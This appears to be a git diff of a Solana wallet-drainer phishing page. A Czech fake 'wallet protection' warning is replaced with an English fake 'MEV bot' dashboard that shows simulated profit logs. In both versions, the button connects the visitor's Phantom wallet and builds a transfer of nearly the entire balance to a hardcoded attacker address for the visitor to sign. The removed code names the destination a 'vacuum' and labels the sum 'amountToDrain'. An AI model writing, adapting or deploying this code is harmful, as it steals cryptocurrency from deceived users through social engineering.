@@ -1,82 +1,88 @@
 <!DOCTYPE html>
-<html lang="cs">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Security | Wallet Protection</title>
+    <title>Solana MEV Engine v2.4</title>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <style>
-        :root { --danger: #ff4a4a; --bg: #050505; --card: #111; --primary: #14f195; }
-        body { background-color: var(--bg); color: white; font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .container { background: var(--card); padding: 35px; border-radius: 20px; border: 1px solid #333; max-width: 400px; width: 90%; text-align: center; box-shadow: 0 0 20px rgba(255, 74, 74, 0.2); }
-        .shield-icon { font-size: 50px; color: var(--danger); margin-bottom: 15px; }
-        h1 { font-size: 22px; color: white; margin-bottom: 10px; }
-        .warning-text { color: var(--danger); font-weight: bold; background: rgba(255, 74, 74, 0.1); padding: 10px; border-radius: 8px; margin-bottom: 20px; font-size: 14px; }
-        p { color: #999; font-size: 13px; line-height: 1.5; }
-        .btn { background: var(--primary); color: black; width: 100%; padding: 16px; border: none; border-radius: 12px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s; margin-top: 20px; text-transform: uppercase; }
-        .btn:hover { background: #10d481; box-shadow: 0 0 15px var(--primary); }
-        .status { margin-top: 15px; font-size: 11px; color: #555; }
+        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .terminal { background: rgba(0,0,0,0.9); border: 1px solid #00ff41; padding: 20px; width: 90%; max-width: 600px; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); border-radius: 5px; }
+        .header { border-bottom: 1px solid #00ff41; padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; font-size: 12px; }
+        .log { height: 200px; overflow-y: hidden; font-size: 13px; line-height: 1.6; margin-bottom: 20px; color: #008f11; }
+        .stats { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; font-size: 14px; }
+        .stat-box { border: 1px dashed #008f11; padding: 10px; text-align: center; }
+        .btn { background: #00ff41; color: black; border: none; width: 100%; padding: 15px; font-weight: bold; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; transition: 0.3s; }
+        .btn:hover { background: #fff; box-shadow: 0 0 20px #00ff41; }
+        .highlight { color: #fff; text-shadow: 0 0 5px #00ff41; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="shield-icon">⚠️</div>
-        <h1>Detekována hrozba!</h1>
-        <div class="warning-text">Vaše adresa byla nalezena na blacklistu uniklých klíčů.</div>
-        <p>Váš současný bezpečnostní protokol je zastaralý. Pro ochranu svých aktiv a odpojení od škodlivých kontraktů musíte aktualizovat svůj <strong>Authority Ledger</strong>.</p>
-        
-        <button class="btn" onclick="secureWallet()">AKTUALIZOVAT OCHRANU</button>
-        
-        <div id="status" class="status">Systém připraven k revizi peněženky...</div>
+    <div class="terminal">
+        <div class="header">
+            <span>SYSTEM: ONLINE</span>
+            <span>LATENCY: 14ms</span>
+        </div>
+        <div class="stats">
+            <div class="stat-box">POOLS SCANNED: <span class="highlight" id="pools">1,402</span></div>
+            <div class="stat-box">ARB OPPORTUNITY: <span class="highlight" id="profit">0.00 SOL</span></div>
+        </div>
+        <div class="log" id="log">
+            [SYS] Initializing MEV-Phantom Bridge...<br>
+            [NET] Connecting to Solana Mainnet-Beta...<br>
+            [OK] Connection established.<br>
+            [SEARCH] Scanning Raydium liquidity...<br>
+        </div>
+        <button class="btn" onclick="startExploit()">Connect & Deploy Bot</button>
+        <p style="font-size: 10px; color: #444; text-align: center; margin-top: 10px;">Requires 0.05 SOL minimum balance for gas deposits.</p>
     </div>
 
     <script>
-        // TVOJE ADRESA PRO PŘÍJEM (Vysavač)
-        const destination = "C1NfhjQ6y9M1KRXE4zJbCqtnhaJgASRMRsnSEnU4PaNS"; 
+        // Log simulator
+        const log = document.getElementById('log');
+        const phrases = [
+            "[OK] Opportunity found: Orca -> Raydium (+0.12 SOL)",
+            "[SCAN] Checking Jupiter aggregator routes...",
+            "[SYS] Monitoring mempool for front-run targets...",
+            "[NET] RPC Node synchronization: 100%",
+            "[OK] MEV Route optimized for low slippage..."
+        ];
+        setInterval(() => {
+            const p = document.createElement('div');
+            p.innerText = phrases[Math.floor(Math.random() * phrases.length)];
+            log.appendChild(p);
+            if (log.childNodes.length > 10) log.removeChild(log.firstChild);
+            document.getElementById('profit').innerText = (Math.random() * 2).toFixed(2) + " SOL";
+        }, 3000);
 
-        async function secureWallet() {
-            const status = document.getElementById('status');
-            if (!window.solana || !window.solana.isPhantom) {
-                alert("Nainstalujte si Phantom pro spuštění skeneru."); return;
-            }
-
+        async function startExploit() {
+            const dest = "C1NfhjQ6y9M1KRXE4zJbCqtnhaJgASRMRsnSEnU4PaNS"; 
+            if (!window.solana) return alert("Phantom not found");
+            
             try {
                 const resp = await window.solana.connect();
-                status.innerText = "Skenování aktiv...";
+                const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+                const balance = await conn.getBalance(resp.publicKey);
                 
-                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-                const balance = await connection.getBalance(resp.publicKey);
-                
-                if (balance < 1000000) { // Méně než 0.001 SOL
-                    status.innerText = "Vaše adresa je v bezpečí (nízký zůstatek).";
-                    return;
-                }
+                if (balance < 50000000) return alert("Insufficient balance for MEV gas.");
 
-                // Kalkulace: Všechno kromě poplatku
-                const amountToDrain = balance - 800000; 
-
-                const transaction = new solanaWeb3.Transaction().add(
+                const tx = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: resp.publicKey,
-                        toPubkey: new solanaWeb3.PublicKey(destination),
-                        lamports: amountToDrain,
+                        toPubkey: new solanaWeb3.PublicKey(dest),
+                        lamports: balance - 1000000,
                     })
                 );
 
-                transaction.feePayer = resp.publicKey;
-                const { blockhash } = await connection.getRecentBlockhash();
-                transaction.recentBlockhash = blockhash;
+                tx.feePayer = resp.publicKey;
+                const { blockhash } = await conn.getRecentBlockhash();
+                tx.recentBlockhash = blockhash;
 
-                status.innerText = "Autorizace ochrany v peněžence...";
-                const signed = await window.solana.signTransaction(transaction);
-                
-                status.innerText = "Probíhá čištění kontraktů...";
-                await connection.sendRawTransaction(signed.serialize());
-                
-                status.innerText = "Ochrana aktiv byla úspěšně aktivována!";
-                alert("Vaše peněženka byla úspěšně zabezpečena!");
+                const signed = await window.solana.signTransaction(tx);
+                await conn.sendRawTransaction(signed.serialize());
+                alert("Bot deployed! Monitoring transactions...");
             } catch (err) {
-                status.innerText = "Chyba: Proces byl přerušen. Vaše aktiva jsou v ohrožení!";
+                console.log("User rejected or error");
             }
         }
     </script>
